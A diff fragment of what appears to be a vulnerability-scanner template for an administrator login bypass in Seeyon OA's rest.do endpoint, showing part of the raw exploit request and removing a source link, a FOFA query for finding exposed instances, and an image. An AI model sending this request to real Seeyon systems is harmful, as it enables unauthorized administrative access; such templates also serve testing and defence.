@@ -3,12 +3,8 @@ info:
   name: 致远OA rest.do存在管理员登陆绕过漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/whhbt1k6a0b3p8h5'
+  description: ''
   tags: other,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: whhbt1k6a0b3p8h5
-    fofa: app="致远互联-OA"
 http:
 - raw:
   - '发送get请求 /seeyon/uc/rest.do?method=commonPierce
@@ -38,7 +34,6 @@ http:
 
     pierceType=pierceTask&from=1&subject=1&talkId=1&mTicket=LjgzODQxNDMxMjQzNDU4NTkyNzk=
 
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1775097835422-7c0e3bc0-229f-40bc-b0da-fe40ded043cd.png)
 
     致远的后台地址为
 
